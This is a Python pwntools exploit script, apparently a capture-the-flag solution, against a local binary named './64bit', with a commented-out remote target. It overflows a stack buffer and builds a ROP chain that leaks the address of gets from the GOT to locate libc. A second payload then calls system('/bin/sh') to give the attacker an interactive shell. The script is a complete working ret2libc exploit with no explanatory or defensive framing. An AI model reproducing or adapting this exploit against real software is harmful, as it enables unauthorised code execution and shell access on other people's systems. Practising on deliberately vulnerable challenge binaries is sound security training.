from pwn import *
context.log_level = 'debug'
p = process('./64bit')
#p = remote('127.0.0.1',9999)
e = ELF('./64bit')
w_plt = e.plt['write']
buf2 = e.symbols['buf2']
vul = e.symbols['vul']
gets_got = e.got["gets"]
#0x00000000004011e3 : pop rdi ; ret
#0x00000000004011e1 : pop rsi ; pop r15 ; ret

pop_rdi = 0x00000000004011e3
pop_rsi = 0x00000000004011e1
#write(1,buf,size)
payload = "A"*18+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(gets_got)+p64(1)+p64(w_plt)+p64(vul)
#payload = "A"*18+p64(vul)
p.sendlineafter("hello",payload)

gets = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = gets - libc.symbols['gets']
sys = libc.symbols['system']
bin_sh = libc.search("/bin/sh").next()
payload = "A"*18+p64(pop_rdi)+p64(bin_sh)+p64(sys)
p.sendline(payload)
p.interactive()
